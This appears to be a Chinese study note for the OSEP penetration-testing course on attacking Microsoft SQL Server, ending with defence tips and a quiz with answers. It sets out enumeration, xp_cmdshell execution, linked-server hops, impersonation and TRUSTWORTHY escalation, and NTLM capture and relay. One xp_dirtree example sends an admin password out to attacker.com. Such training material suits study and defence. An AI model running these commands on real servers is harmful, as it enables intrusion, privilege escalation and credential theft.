---
title: OSEP-15-MSSQL攻击技术
description: '15-MSSQL攻击 | 01-MSSQL攻击技术'
pubDate: 2026-01-30T00:02:24+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Exploit Development
  - SQL Injection
---

# Module 15: MS SQL 攻击

## 第一节：MS SQL 攻击技术

### 为什么关注 MS SQL？

Microsoft SQL Server 是企业环境中最常见的数据库之一，通常具有高权限，是横向移动和权限提升的重要目标。

---

## 一、MS SQL 基础

### 1.1 MS SQL 概述

```
MS SQL 特点:
├── 企业级数据库
├── 通常以高权限运行
├── 支持链接服务器
├── 内置命令执行功能
├── 常见端口: 1433 (TCP)
└── 浏览器服务: 1434 (UDP)
```

### 1.2 MS SQL 权限模型

| 角色 | 权限 |
|------|------|
| sysadmin | 完全控制 |
| serveradmin | 服务器配置 |
| securityadmin | 登录和权限管理 |
| db_owner | 数据库完全控制 |
| public | 基本访问 |

### 1.3 认证方式

```
认证类型:
├── Windows 认证 (集成认证)
│   └── 使用 Windows 凭证
├── SQL Server 认证
│   └── 使用 SQL 用户名/密码
└── 混合模式
    └── 同时支持两种方式
```

---

## 二、MS SQL 枚举

### 2.1 发现 SQL Server

```bash
# Nmap 扫描
nmap -p 1433 --script ms-sql-info target

# 使用 UDP 扫描浏览器服务
nmap -sU -p 1434 --script ms-sql-info target

# Metasploit 扫描
msf6> use auxiliary/scanner/mssql/mssql_ping
msf6> set RHOSTS 192.168.1.0/24
msf6> run
```

### 2.2 PowerUpSQL 枚举

```powershell
# 导入模块
Import-Module .\PowerUpSQL.ps1

# 发现 SQL Server 实例
Get-SQLInstanceDomain
Get-SQLInstanceLocal
Get-SQLInstanceBroadcast

# 测试连接
Get-SQLConnectionTest -Instance "server\instance"

# 获取服务器信息
Get-SQLServerInfo -Instance "server\instance"
```

### 2.3 检查权限

```powershell
# 检查当前用户权限
Get-SQLServerInfo -Instance "server" | Select-Object IsSysadmin

# 检查可访问的数据库
Get-SQLDatabase -Instance "server"

# 检查链接服务器
Get-SQLServerLink -Instance "server"
```

---

## 三、命令执行

### 3.1 xp_cmdshell

```sql
-- 检查 xp_cmdshell 是否启用
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

-- 启用 xp_cmdshell (需要 sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 执行命令
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
```

### 3.2 PowerUpSQL 命令执行

```powershell
# 检查 xp_cmdshell
Get-SQLQuery -Instance "server" -Query "SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'"

# 启用并执行命令
Invoke-SQLOSCmd -Instance "server" -Command "whoami" -RawResults
```

### 3.3 Impacket mssqlclient

```bash
# 连接到 SQL Server
impacket-mssqlclient domain/user:password@target

# 启用 xp_cmdshell
SQL> enable_xp_cmdshell

# 执行命令
SQL> xp_cmdshell whoami
SQL> xp_cmdshell ipconfig
```

---

## 四、链接服务器攻击

### 4.1 什么是链接服务器？

```
链接服务器:
├── 允许 SQL Server 连接其他数据源
├── 可以是其他 SQL Server
├── 可能配置了更高权限
├── 可以用于横向移动
└── 可能形成信任链
```

### 4.2 枚举链接服务器

```sql
-- 查看链接服务器
SELECT * FROM sys.servers;

-- 或使用存储过程
EXEC sp_linkedservers;

-- 查看链接服务器配置
SELECT * FROM sys.linked_logins;
```

### 4.3 通过链接服务器执行命令

```sql
-- 在链接服务器上执行查询
SELECT * FROM OPENQUERY("LinkedServer", 'SELECT @@servername');

-- 在链接服务器上执行命令
EXEC ('xp_cmdshell ''whoami''') AT LinkedServer;

-- 嵌套链接 (双跳)
SELECT * FROM OPENQUERY("Server1", 'SELECT * FROM OPENQUERY("Server2", ''SELECT @@servername'')');
```

### 4.4 PowerUpSQL 链接服务器

```powershell
# 枚举链接服务器
Get-SQLServerLink -Instance "server"

# 爬取链接服务器链
Get-SQLServerLinkCrawl -Instance "server"

# 在链接服务器上执行命令
Get-SQLServerLinkCrawl -Instance "server" -Query "EXEC xp_cmdshell 'whoami'"
```

---

## 五、权限提升

### 5.1 模拟 (Impersonation)

```sql
-- 检查可模拟的登录
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';

-- 模拟其他用户
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
EXEC xp_cmdshell 'whoami';
REVERT;
```

### 5.2 PowerUpSQL 模拟

```powershell
# 检查可模拟的登录
Invoke-SQLAuditPrivImpersonateLogin -Instance "server"

# 利用模拟
Invoke-SQLEscalatePriv -Instance "server" -Technique Impersonate
```

### 5.3 Trustworthy 数据库

```sql
-- 检查 Trustworthy 数据库
SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1;

-- 如果当前用户是 db_owner，可以提升到 sysadmin
USE [TrustworthyDB];
CREATE PROCEDURE sp_elevate
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'domain\user', 'sysadmin';
GO
EXEC sp_elevate;
```

---

## 六、数据外泄

### 6.1 读取文件

```sql
-- 使用 OPENROWSET 读取文件
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;

-- 使用 xp_cmdshell
EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts';
```

### 6.2 写入文件

```sql
-- 使用 xp_cmdshell 写入文件
EXEC xp_cmdshell 'echo test > C:\temp\test.txt';

-- 使用 BCP 导出数据
EXEC xp_cmdshell 'bcp "SELECT * FROM database.dbo.table" queryout "C:\temp\data.txt" -c -T';
```

### 6.3 通过 DNS 外泄

```sql
-- 使用 xp_dirtree 触发 DNS 请求
EXEC xp_dirtree '\\attacker.com\share';

-- 外泄数据
DECLARE @data VARCHAR(100);
SELECT @data = password FROM users WHERE username = 'admin';
EXEC xp_dirtree '\\' + @data + '.attacker.com\share';
```

---

## 七、UNC 路径攻击

### 7.1 捕获 NTLM 哈希

```sql
-- 触发 SMB 连接
EXEC xp_dirtree '\\attacker_ip\share';
EXEC xp_fileexist '\\attacker_ip\share\file';

-- 使用 OPENROWSET
SELECT * FROM OPENROWSET('SQLNCLI', 'Server=\\attacker_ip\share;', 'SELECT 1');
```

### 7.2 Responder 捕获

```bash
# 在攻击者机器上运行 Responder
sudo responder -I eth0

# 等待 SQL Server 连接
# 捕获 NTLM 哈希
```

### 7.3 NTLM 中继

```bash
# 使用 ntlmrelayx
impacket-ntlmrelayx -t target_server -smb2support

# 触发 SQL Server 连接到攻击者
# 中继到目标服务器
```

---

## 八、实践示例

### 8.1 完整攻击流程

```
1. 发现 SQL Server
   - 端口扫描
   - 服务枚举

2. 获取访问
   - 弱密码
   - Windows 认证
   - SQL 注入

3. 权限检查
   - 检查 sysadmin
   - 检查可模拟的用户
   - 检查链接服务器

4. 命令执行
   - 启用 xp_cmdshell
   - 执行系统命令

5. 横向移动
   - 利用链接服务器
   - 捕获/中继 NTLM

6. 数据外泄
   - 读取敏感文件
   - 导出数据库
```

### 8.2 Metasploit 模块

```bash
# 登录扫描
use auxiliary/scanner/mssql/mssql_login

# 枚举
use auxiliary/admin/mssql/mssql_enum

# 命令执行
use auxiliary/admin/mssql/mssql_exec

# 提权
use exploit/windows/mssql/mssql_payload
```

---

## 九、防御建议

### 9.1 安全配置

```
安全建议:
├── 禁用 xp_cmdshell
├── 使用最小权限原则
├── 禁用不必要的链接服务器
├── 使用强密码
├── 启用审计日志
├── 限制网络访问
└── 定期更新补丁
```

### 9.2 监控

```
监控建议:
├── 监控 xp_cmdshell 调用
├── 监控链接服务器查询
├── 监控失败的登录尝试
├── 监控权限变更
└── 监控异常查询
```

---

## 十、章节测试

### 选择题

1. MS SQL Server 的默认端口是？
   - A) 1521
   - B) 1433
   - C) 3306
   - D) 5432

2. 哪个存储过程可以执行系统命令？
   - A) sp_execute
   - B) xp_cmdshell
   - C) sp_cmd
   - D) xp_execute

3. 链接服务器的主要用途是？
   - A) 备份数据
   - B) 连接其他数据源
   - C) 加密数据
   - D) 压缩数据

4. 哪个权限可以启用 xp_cmdshell？
   - A) public
   - B) db_owner
   - C) sysadmin
   - D) securityadmin

5. UNC 路径攻击可以捕获什么？
   - A) 明文密码
   - B) NTLM 哈希
   - C) Kerberos 票据
   - D) SSH 密钥

### 答案

1-B, 2-B, 3-B, 4-C, 5-B

---

**返回**：知识库目录
